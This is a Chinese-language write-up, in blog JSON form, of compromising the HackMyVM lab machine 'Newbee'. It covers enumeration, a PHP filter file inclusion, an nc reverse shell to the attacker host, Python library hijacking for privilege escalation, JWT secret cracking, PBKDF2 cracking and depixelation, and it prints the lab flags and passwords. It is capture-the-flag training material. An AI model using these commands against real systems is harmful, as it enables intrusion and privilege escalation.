{"pageProps":{"postData":{"id":"HackMyVMNewbee","contentHtml":"<h1>Newbee.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Newbee\">https://hackmyvm.eu/machines/machine.php?vm=Newbee</a></p>\n</blockquote>\n<p>Notes：<strong>None</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Newbee nmap -sP 192.168.111.0/24                \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-15 00:49 EDT\nMAC Address: 00:50:56:FB:CA:45 (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.111.150\nHost is up (0.000098s latency).\nMAC Address: 00:50:56:E7:CE:2D (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.111.162\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (5 hosts up) scanned <span class=\"hljs-keyword\">in</span> 2.06 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Newbee nmap -sT -min-rate 10000 -p- 192.168.111.150\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-15 00:56 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.111.150\nHost is up (0.0019s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 00:0C:29:16:FC:B5 (VMware)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Newbee nmap -sT -A -T4 -O -p 22,80 192.168.111.150 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-15 00:57 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.111.150\nHost is up (0.00023s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\n| ssh-hostkey: \n|   256 92:6e:6d:b0:bd:08:1e:db:9d:56:0e:f8:15:25:ca:21 (ECDSA)\n|_  256 88:d7:08:bd:a2:95:75:cc:71:06:47:ae:fd:d3:8b:b9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: PHPJabbers.com | Free Food Store Website Template\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 00:0C:29:16:FC:B5 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.23 ms 192.168.111.150\n</code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p>访问，页脚中可以知道是通过 <code>PHPJabbers</code> 构建的</p>\n<p><img src=\"/post-images/HackMyVMNewbee/image.png\" alt=\"image.png\"></p>\n<p>目录扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Newbee gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.111.150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -b 404,301,403 --no-error                                                                  \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.111.150\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,404,301\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/index.php            (Status: 200) [Size: 18852]\n/contact.php          (Status: 200) [Size: 8853]\n/about.php            (Status: 200) [Size: 10036]\n/blog.php             (Status: 200) [Size: 9782]\n/products.php         (Status: 200) [Size: 12163]\n/terms.php            (Status: 200) [Size: 6670]\n/testimonials.php     (Status: 200) [Size: 7907]\n/checkout.php         (Status: 200) [Size: 13307]\n/secret.php           (Status: 200) [Size: 2187]\nProgress: 661680 / 661683 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>发现奇怪的页面 <code>/secret.php</code> ，访问</p>\n<p><img src=\"/post-images/HackMyVMNewbee/image1.png\" alt=\"image.png\"></p>\n<p>尝试 <code>fuzz</code> 参数无果</p>\n<pre><code class=\"hljs language-bash\">➜  Newbee wfuzz -c -w ../../Dict/fuzz/paramDict/AllParam.txt -u http://192.168.111.150/secret.php\\?<span class=\"hljs-built_in\">command</span>\\=<span class=\"hljs-built_in\">ls</span>\\&#x26;\\FUZZ=admin --hh=2175\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.111.150/secret.php?<span class=\"hljs-built_in\">command</span>=<span class=\"hljs-built_in\">ls</span>&#x26;FUZZ=admin\nTotal requests: 74332\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload  \n=====================================================================\n\nTotal <span class=\"hljs-keyword\">time</span>: 120.5883\nProcessed Requests: 74332\nFiltered Requests: 74332\nRequests/sec.: 616.4110\n</code></pre>\n<p>没思路呢，看了下 <code>WP</code>，发现主页源代码最下面有一句话</p>\n<p><img src=\"/post-images/HackMyVMNewbee/image2.png\" alt=\"image.png\"></p>\n<p>根据提示 <code>fuzz</code> 参数</p>\n<pre><code class=\"hljs language-bash\">➜  Newbee wfuzz -c -w ../../Dict/fuzz/paramDict/AllParam.txt -u http://192.168.111.150\\?FUZZ\\= --hh=18851\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.111.150?FUZZ=/\nTotal requests: 74332\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload  \n=====================================================================\n\n000027398:   200        376 L    1270 W     18863 Ch    <span class=\"hljs-string\">\"hack\"</span>     \n</code></pre>\n<h3>文件包含</h3>\n<p>根据上下文，尝试使用主页参数包含<code>secret.php</code></p>\n<pre><code class=\"hljs language-bash\">http://192.168.111.150/index.php?hack=php://filter/read=convert.base64-encode/resource=secret.php\n</code></pre>\n<p><img src=\"/post-images/HackMyVMNewbee/image3.png\" alt=\"image.png\"></p>\n<p>成功包含，将其进行<code>base64</code>解码</p>\n<pre><code class=\"hljs language-bash\">&#x3C;!DOCTYPE html>\n&#x3C;html lang=<span class=\"hljs-string\">\"zh-CN\"</span>>\n&#x3C;<span class=\"hljs-built_in\">head</span>>\n    &#x3C;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>>\n    &#x3C;meta name=<span class=\"hljs-string\">\"viewport\"</span> content=<span class=\"hljs-string\">\"width=device-width, initial-scale=1.0\"</span>>\n    &#x3C;title>å½ä»¤è¡æ§å¶å°&#x3C;/title>\n    &#x3C;style>\n        body {\n            background-color: <span class=\"hljs-comment\">#1e1e1e;</span>\n            font-family: Consolas, monospace;\n            color: <span class=\"hljs-comment\">#fff;</span>\n            margin: 0;\n            padding: 0;\n        }\n\n        .console {\n            width: 80%;\n            margin: 50px auto;\n            padding: 20px;\n            background-color: <span class=\"hljs-comment\">#000;</span>\n            border-radius: 8px;\n            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);\n            height: 400px;\n            overflow-y: auto;\n            font-size: 16px;\n        }\n\n        .output {\n            white-space: pre-wrap;\n            margin-bottom: 10px;\n        }\n\n        .input-container {\n            display: flex;\n            align-items: center;\n        }\n\n        .input-container .prompt {\n            color: <span class=\"hljs-comment\">#00ff00;</span>\n            margin-right: 5px;\n        }\n\n        .input-container input {\n            background: transparent;\n            border: none;\n            color: <span class=\"hljs-comment\">#fff;</span>\n            width: 100%;\n            padding: 5px;\n            font-size: 16px;\n            outline: none;\n        }\n\n        .input-container input:focus {\n            border: 1px solid <span class=\"hljs-comment\">#00ff00;</span>\n        }\n\n        .input-container input::placeholder {\n            color: <span class=\"hljs-comment\">#888;</span>\n        }\n\n        .console-footer {\n            padding-top: 10px;\n            color: <span class=\"hljs-comment\">#888;</span>\n            font-size: 12px;\n            text-align: center;\n        }\n    &#x3C;/style>\n&#x3C;/head>\n&#x3C;body>\n\n&#x3C;div class=<span class=\"hljs-string\">\"console\"</span>>\n    &#x3C;div class=<span class=\"hljs-string\">\"output\"</span> <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"output\"</span>>\n        &#x3C;?php\n\n        <span class=\"hljs-keyword\">if</span> (isset(<span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">'AreYouAdmin'</span>]) &#x26;&#x26; <span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">'AreYouAdmin'</span>] === <span class=\"hljs-string\">'Yes'</span>) {\n\n            <span class=\"hljs-keyword\">if</span> (isset(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'command'</span>])) {\n                <span class=\"hljs-variable\">$command</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'command'</span>];\n                <span class=\"hljs-variable\">$output</span> = shell_exec(<span class=\"hljs-variable\">$command</span>);\n                <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'&#x3C;div>\\> '</span> . htmlspecialchars(<span class=\"hljs-variable\">$command</span>) . <span class=\"hljs-string\">'&#x3C;/div>'</span>;\n                <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'&#x3C;div>'</span> . nl2br(htmlspecialchars(<span class=\"hljs-variable\">$output</span>)) . <span class=\"hljs-string\">'&#x3C;/div>'</span>;\n            }\n        } <span class=\"hljs-keyword\">else</span> {\n            <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'&#x3C;div>No permission to execute commands, lacking admin permission.&#x3C;/div>'</span>;\n        }\n        ?>\n    &#x3C;/div>\n\n    &#x3C;div class=<span class=\"hljs-string\">\"input-container\"</span>>\n        &#x3C;span class=<span class=\"hljs-string\">\"prompt\"</span>>\\>&#x3C;/span>\n        &#x3C;form method=<span class=\"hljs-string\">\"get\"</span>>\n            &#x3C;input <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"command\"</span> <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"input\"</span> placeholder=<span class=\"hljs-string\">\"command...\"</span> autocomplete=<span class=\"hljs-string\">\"off\"</span>>\n        &#x3C;/form>\n    &#x3C;/div>\n&#x3C;/div>\n\n&#x3C;script>\n    const inputField = document.getElementById(<span class=\"hljs-string\">\"input\"</span>);\n\n    inputField.focus();\n&#x3C;/script>\n\n&#x3C;/body>\n&#x3C;/html>\n</code></pre>\n<p>设置 <code>cookie</code> ，当 <code>AreYouAdmin</code> 等于 <code>yes</code> 时就可以执行命令</p>\n<p><img src=\"/post-images/HackMyVMNewbee/image4.png\" alt=\"image.png\"></p>\n<p>进行反弹<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">nc+192.168.111.162+1234+-e+%2Fbin%2Fbash\n</code></pre>\n<p><img src=\"/post-images/HackMyVMNewbee/image5.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackMyVMNewbee/image6.png\" alt=\"image.png\"></p>\n<h2>提权 - To Debian</h2>\n<h3>信息收集</h3>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">www-data@Newbee:/var/www/html$ <span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span>: unable to resolve host Newbee: Name or service not known\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> www-data on Newbee:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, targetpw, use_pty\n\nUser www-data may run the following commands on Newbee:\n    (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py\n</code></pre>\n<p>查看 <code>vuln.py</code> 内容</p>\n<pre><code class=\"hljs language-bash\">www-data@Newbee:/var/www/html$ <span class=\"hljs-built_in\">cat</span> vuln.py \nimport random\nimport <span class=\"hljs-keyword\">time</span>\nimport math\nimport string\nimport datetime\n\ndef generate_random_string(length=10):\n\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-string\">''</span>.<span class=\"hljs-built_in\">join</span>(random.choices(string.ascii_letters + string.digits, k=length))\n\ndef pointless_computation():\n\n    number = random.randint(1, 1000)\n    result = math.sqrt(number) * math.log(number)\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"Calculated math nonsense: sqrt({number}) * log({number}) = {result}\"</span>)\n\ndef simulate_time_wasting():\n\n    now = datetime.datetime.now()\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"Started wasting time at {now}\"</span>)\n    time.sleep(2)  <span class=\"hljs-comment\"># 故意睡眠 2 秒</span>\n    later = datetime.datetime.now()\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"Finished wasting time at {later}. Time wasted: {later - now}\"</span>)\n\ndef pointless_string_operations():\n\n    rand_str = generate_random_string()\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"Generated random string: {rand_str}\"</span>)\n    reversed_str = rand_str[::-1]\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"Reversed string: {reversed_str}\"</span>)\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"String length: {len(rand_str)}\"</span>)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    pointless_computation()\n    simulate_time_wasting()\n    pointless_string_operations()\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"All done. The script accomplished nothing useful.\"</span>)\n</code></pre>\n<p>像是在做无用功的操作</p>\n<p><img src=\"/post-images/HackMyVMNewbee/image7.png\" alt=\"image.png\"></p>\n<h3>Python 库劫持</h3>\n<p>但是我们可以看到当前目录是可以进行写权限的</p>\n<pre><code class=\"hljs language-bash\">www-data@Newbee:/var/www/html$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 20\ndrwxrwxrwx 4 root     root     4096 Mar  8 22:29 .\ndrwxr-xr-x 3 root     root     4096 Mar  6 00:23 ..\n-rw-r--r-- 1 root     root        0 Mar  6 19:02 .htaccess\ndrwxr-xr-x 3 root     root     4096 Mar  8 07:06 flask\ndrwxr-xr-x 3 www-data www-data 4096 Mar  7 00:20 shop\n-rwxr-xr-x 1 root     root     1086 Mar  8 07:10 vuln.py\n</code></pre>\n<p>可以进行库劫持，<code>Python</code> 以就近原则导入库</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># random.py</span>\nimport os\nos.system(<span class=\"hljs-string\">\"/bin/bash -p\"</span>)\n</code></pre>\n<p><img src=\"/post-images/HackMyVMNewbee/image8.png\" alt=\"image.png\"></p>\n<h2>提权 - To Root</h2>\n<p><code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">debian@Newbee:~$ <span class=\"hljs-built_in\">cat</span> user.txt \ned2b1f468c5f915f3f1cf75d7068baae\n</code></pre>\n<p>当前目录下还有 <code>note.txt</code> 以及 <code>config.php</code></p>\n<pre><code class=\"hljs language-bash\">debian@Newbee:~$ <span class=\"hljs-built_in\">cat</span> note.txt \nDamn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can <span class=\"hljs-built_in\">help</span> me\n</code></pre>\n<pre><code class=\"hljs language-bash\">debian@Newbee:~$ <span class=\"hljs-built_in\">cat</span> config.php \n&#x3C;?php\n<span class=\"hljs-variable\">$servername</span> = <span class=\"hljs-string\">\"localhost\"</span>;\n<span class=\"hljs-variable\">$username</span> = <span class=\"hljs-string\">\"root\"</span>;\n<span class=\"hljs-variable\">$password</span> = <span class=\"hljs-string\">\"\n\n<span class=\"hljs-variable\">$conn</span> = new mysqli(<span class=\"hljs-variable\">$servername</span>, <span class=\"hljs-variable\">$username</span>, <span class=\"hljs-variable\">$password</span>);\n\n............\n............\n</span></code></pre>\n<p>查看一下正在监听的端口</p>\n<pre><code class=\"hljs language-bash\">debian@Newbee:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                    Local Address:Port                                     Peer Address:Port                  Process                  \nudp                    UNCONN                  0                       0                                               0.0.0.0:68                                            0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                           127.0.0.1:5000                                          0.0.0.0:*                                              \ntcp                    LISTEN                  0                       80                                            127.0.0.1:3306                                          0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                             0.0.0.0:22                                            0.0.0.0:*                                              \ntcp                    LISTEN                  0                       511                                                   *:80                                                  *:*                                              \ntcp                    LISTEN                  0                       128                                                [::]:22                                               [::]:*  \n</code></pre>\n<p>发现一个在本地运行的<code>5000</code>端口，将其转发出去</p>\n<pre><code class=\"hljs language-bash\">debian@Newbee:/tmp$ ./socat TCP-LISTEN:5001,fork tcp4:127.0.0.1:5000 &#x26;\n[1] 38466\n</code></pre>\n<p>访问转发出去的端口</p>\n<p><img src=\"/post-images/HackMyVMNewbee/image9.png\" alt=\"image.png\"></p>\n<p>在源代码页能找到</p>\n<p><img src=\"/post-images/HackMyVMNewbee/image10.png\" alt=\"image.png\"></p>\n<p>登录页，尝试爆破一下，无果</p>\n<p><img src=\"/post-images/HackMyVMNewbee/image11.png\" alt=\"image.png\"></p>\n<h3>JWT 弱密钥</h3>\n<p>但是貌似除了<code>admin</code>用户其他用户都能直接登陆进去，这里使用 <code>1:1</code> ，登陆后会返回一串 <code>JWT</code></p>\n<p><img src=\"/post-images/HackMyVMNewbee/image12.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEiLCJleHAiOjE3NDcyOTQyNTR9.iuXXxwNMPDYzab4OtZkI_vBS1nl9oj434Wp0kqavP_E\n</code></pre>\n<p>通过之前源代码发现的话，猜测是弱密钥，保存JWT使用<code>hashcat</code>爆破</p>\n<p><img src=\"/post-images/HackMyVMNewbee/image13.png\" alt=\"image.png\"></p>\n<p>得到密钥<code>noob</code> ，构造 <code>JWT</code></p>\n<p><img src=\"/post-images/HackMyVMNewbee/image14.png\" alt=\"image.png\"></p>\n<p>将其替换掉原本的 <code>JWT</code> ，即可显示内容</p>\n<p><img src=\"/post-images/HackMyVMNewbee/image15.png\" alt=\"image.png\"></p>\n<p>得到数据库账号密码：<code>root:TheStrongestPasswordHYHcreated</code></p>\n<pre><code class=\"hljs language-bash\">MariaDB [user]> <span class=\"hljs-keyword\">select</span> * from user;\n+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+\n| <span class=\"hljs-built_in\">id</span> | username | passwd                                                                                                                   | salt                             | passwd_hash_algo |\n+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+\n|  1 | debian   | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500<span class=\"hljs-variable\">$60</span>   |\n+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+\n1 row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.011 sec)\n</code></pre>\n<h3>爆破 <strong>PBKDF2</strong></h3>\n<p>喂给 GPT，这段密码并不是传统的 MD5/ SHA1/ SHA256 之类的「一次性哈希」，而是用 <strong>PBKDF2（Password-Based Key Derivation Function 2）</strong></p>\n<p>示例链接：<a href=\"https://wsxk.github.io/hashcatgpu/\">https://wsxk.github.io/hashcatgpu/</a> | <a href=\"https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256\">https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256</a></p>\n<pre><code class=\"hljs language-bash\">sha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA\n</code></pre>\n<pre><code class=\"hljs language-bash\">hashcat -m 10900 pass.txt /usr/share/wordlists/rockyou.txt\n...\nsha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA:1qaz2wsx\n</code></pre>\n<p>得到密码<code>1qaz2wsx</code> ，查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">debian@Newbee:/tmp$ <span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span>: unable to resolve host Newbee: Name or service not known\n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> debian: \nSorry, try again.\n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> debian: \n<span class=\"hljs-built_in\">sudo</span>: 1 incorrect password attempt\n</code></pre>\n<p>看来密码不是用在这里的，在家目录发现 <code>.secret</code>文件夹</p>\n<pre><code class=\"hljs language-bash\">debian@Newbee:~/.secret$ <span class=\"hljs-built_in\">ls</span>\nhint.txt  password.zip\ndebian@Newbee:~/.secret$ <span class=\"hljs-built_in\">cat</span> hint.txt \npassword is md5(key)\n\nand key is <span class=\"hljs-keyword\">in</span> mysql!!!!!!\n</code></pre>\n<p>压缩包密码是<code>1qaz2wsx</code>的<code>md5</code>值</p>\n<pre><code class=\"hljs language-bash\">debian@Newbee:~/.secret$ <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"1qaz2wsx\"</span> | <span class=\"hljs-built_in\">md5sum</span> | awk <span class=\"hljs-string\">'{print $1}'</span>\n1c63129ae9db9c60c3e8aa94d3e00495\n</code></pre>\n<h3>图片修复</h3>\n<p>解压后是一张图片</p>\n<pre><code class=\"hljs language-bash\">➜  Newbee unzip password.zip        \nArchive:  password.zip\n[password.zip] password.png password: \n extracting: password.png   \n</code></pre>\n<p>超级糊</p>\n<p><img src=\"/post-images/HackMyVMNewbee/image16.png\" alt=\"image.png\"></p>\n<p>经过查阅，可以使用 <code>Depix</code> 来修复：<a href=\"https://github.com/spipm/Depixelization_poc\">https://github.com/spipm/Depixelization_poc</a></p>\n<p><img src=\"/post-images/HackMyVMNewbee/image17.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackMyVMNewbee/image18.png\" alt=\"image.png\"></p>\n<p><code>hellofromtheotherside</code>和官方工具的演示图片一模一样</p>\n<p>用作密码尝试登录成功</p>\n<p><img src=\"/post-images/HackMyVMNewbee/image19.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">root@Newbee:~# <span class=\"hljs-built_in\">cat</span> root.txt \nc18b3eff03996f3a203f63733be03d15\n</code></pre>\n<h2>总结</h2>\n<p>学到新东西，最后的从模糊的照片中恢复文本，<strong>PBKDF2 Brute</strong>…</p>","title":"HackMyVM - Newbee","date":"2025-05-15","updated":"2025-05-15","tags":["HackMyVM","Linux靶机","Brute","JWT","文件包含","Depix"],"categories":"靶机","comments":true,"description":"Newbee.\n\n https://hackmyvm.eu/machines/machine.php?vm=Newbee\n \n\nNotes：None\n\n前期踩点\n\n\n\n\n\n\n\nWeb 渗透\n\n信息收集\n\n访问，页脚中可以知道是通过 `PHPJabbers` 构建的\n\n\n\n目录扫描\n\n\n\n发现奇怪的页面 `/secret.php` ，访问\n\n\n\n尝试 `fuzz` 参数无果\n\n\n\n没思路呢，看了下 ..."},"recentPosts":[{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"}]},"__N_SSG":true}